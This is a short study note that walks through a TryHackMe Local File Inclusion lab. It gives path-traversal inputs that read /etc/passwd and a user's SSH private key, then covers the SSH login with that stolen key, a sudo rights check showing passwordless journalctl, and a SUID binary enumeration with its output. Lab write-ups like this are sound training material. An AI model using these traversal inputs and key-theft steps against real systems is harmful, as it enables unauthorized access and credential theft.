# LFI Room
#pentest/tryhackme

## What
Teaches about Local File Inclusion and a bit of privilege escalation

## Walkthrough
Find the user `falcon` by going through `../../../etc/passwd`

Find their private key using: `../../../home/falcon/.ssh/id_rsa`

**Copy it and login though ssh:**
```
1. vim falcon_key and paste the id_rsa contents
2. chmod 600 falcon_key
3. ssh falcon@<machine-IP> -i falcon_key
```

**Fetch the user flag after logged in**
`~/user.txt`

**Privilege escalation time:**
[Linux Privilege escalation](https://blog.mzfr.me/linux-priv-esc)
[GTFOBins](https://gtfobins.github.io/) -> GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

**Check for SUDO rights**
```
falcon@walk:~$ sudo -l
Matching Defaults entries for falcon on walk:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falcon may run the following commands on walk:
    (root) NOPASSWD: /bin/journalctl
````

This mean that current user falcon can run journalctl as root without password.

**Finding SUIDs (programs that run as sudo)** 
```
find / -perm -u=s -type f 2>/dev/null
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/at
/usr/bin/newgidmap
/bin/fusermount
/bin/mount
/bin/ping
/bin/umount
/bin/su
```